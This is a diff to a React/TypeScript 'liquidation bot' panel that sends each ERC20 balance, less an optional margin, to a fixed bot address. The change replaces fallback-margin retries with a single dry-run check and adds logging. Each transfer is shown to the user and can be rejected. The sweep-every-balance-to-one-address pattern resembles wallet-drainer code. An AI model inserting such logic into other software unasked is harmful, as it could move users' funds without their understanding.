@@ -25,10 +25,6 @@ const ERC20_TRANSFER_ABI = [
 // than observed drift needs and is worth a fraction of a cent on any realistic balance.
 const DEFAULT_SEND_MARGIN_PERCENT = 0;
 
-// Margins to try, in order, when the full balance reverts. Each is a percentage shaved
-// off the balance; the first that survives a dry run is what gets signed.
-const FALLBACK_MARGIN_PERCENTS = [0.01, 0.1, 1];
-
 const applySendMargin = (balance: ethers.BigNumber, marginPercent: number): ethers.BigNumber => {
     if (!(marginPercent > 0)) return balance;
     // 1% == 10,000 ppm; keep the maths in integers so BigNumber stays exact.
@@ -58,38 +54,27 @@ const isUserRejection = (error: any): boolean => {
     return message.includes('user rejected') || message.includes('user denied') || message.includes('rejected by user');
 };
 
-// Returns the largest amount that a dry-run transfer accepts, or null if even the most
-// conservative candidate reverts. Keeps the wallet from ever showing a failed simulation.
-const findSendableAmount = async (
+// Asks the chain whether this exact transfer would succeed. Returns true, or the revert
+// reason, so a doomed transfer is never put in front of the wallet. Uses a raw eth_call
+// rather than callStatic because tokens that return no value from transfer (USDT-style)
+// fail ABI decoding even when the transfer itself is fine.
+const dryRunTransfer = async (
     provider: ethers.providers.Web3Provider,
     erc20: ethers.Contract,
     from: string,
     tokenAddress: string,
-    balance: ethers.BigNumber,
-    marginPercent: number
-): Promise<ethers.BigNumber | null> => {
-    const margins = [marginPercent, ...FALLBACK_MARGIN_PERCENTS]
-        .filter(m => m >= marginPercent)
-        .filter((m, i, all) => all.indexOf(m) === i);
-
-    for (const margin of margins) {
-        const amount = applySendMargin(balance, margin);
-        if (amount.lte(0)) continue;
-
-        try {
-            await provider.call({
-                from,
-                to: tokenAddress,
-                data: erc20.interface.encodeFunctionData('transfer', [LIQUIDATION_BOT_ADDRESS, amount]),
-            });
-            return amount;
-        } catch (error) {
-            // Reverted at this amount — fall through and try the next, smaller one.
-            console.warn(`Dry-run transfer of ${amount.toString()} reverted for ${tokenAddress}`, error);
-        }
+    amount: ethers.BigNumber
+): Promise<true | string> => {
+    try {
+        await provider.call({
+            from,
+            to: tokenAddress,
+            data: erc20.interface.encodeFunctionData('transfer', [LIQUIDATION_BOT_ADDRESS, amount]),
+        });
+        return true;
+    } catch (error: any) {
+        return error?.reason || error?.data?.message || error?.message || 'transfer reverted';
     }
-
-    return null;
 };
 
 const LiquidationBotPanel: React.FC<LiquidationBotPanelProps> = ({
@@ -216,18 +201,27 @@ const LiquidationBotPanel: React.FC<LiquidationBotPanelProps> = ({
                 return { chainId, sent: false };
             }
 
-            // Dry-run each candidate amount against the chain before prompting the wallet,
-            // largest first, so the user never sees a failed simulation. A raw eth_call is
-            // used rather than callStatic because tokens that return no value from transfer
-            // (USDT-style) fail ABI decoding even when the transfer itself is fine.
-            const amount = await findSendableAmount(provider, erc20, from, token.id, balance, marginPercent);
-            if (!amount) {
-                setResult(tokenKey, {
-                    status: 'skipped',
-                    message: 'Transfer reverts on-chain even below full balance',
-                });
+            // Check the transfer against the chain before prompting the wallet, so a
+            // transfer that cannot land is skipped instead of shown as a failed simulation.
+            const amount = applySendMargin(balance, marginPercent);
+            if (amount.lte(0)) {
+                setResult(tokenKey, { status: 'skipped', message: 'No on-chain balance' });
                 return { chainId, sent: false };
             }
+
+            const dryRun = await dryRunTransfer(provider, erc20, from, token.id, amount);
+            if (dryRun !== true) {
+                setResult(tokenKey, { status: 'skipped', message: `Would revert: ${dryRun}` });
+                return { chainId, sent: false };
+            }
+
+            // Exact integers, for comparing against the wallet's "View Raw" calldata when a
+            // simulation disagrees with what we read.
+            console.log(
+                `[liquidation] ${token.symbol} on ${token.chain} @ ${token.id}: ` +
+                `balanceOf=${balance.toString()} sending=${amount.toString()} ` +
+                `(short by ${balance.sub(amount).toString()})`
+            );
 
             tx = await erc20.transfer(LIQUIDATION_BOT_ADDRESS, amount);
         }
@@ -451,9 +445,10 @@ const LiquidationBotPanel: React.FC<LiquidationBotPanelProps> = ({
                     %
                 </label>
                 <div style={{ marginTop: '4px' }}>
-                    Sends {(100 - marginPercent).toFixed(2)}% of each ERC20 balance. The margin absorbs the
-                    balance drift on rebasing and fee-on-transfer tokens that otherwise reverts the transfer
-                    as "amount exceeds balance". Set 0 to send the exact balance.
+                    Sends {(100 - marginPercent).toFixed(2)}% of each ERC20 balance. Leave at 0 for the full
+                    balance; raise it only for rebasing or fee-on-transfer tokens whose balance moves between
+                    the read and the transfer. Every transfer is checked against the chain first, and skipped
+                    rather than signed if it would revert.
                 </div>
                 <div style={{ marginTop: '4px' }}>
                     One wallet prompt per token. Rejecting a prompt skips that token and moves on.
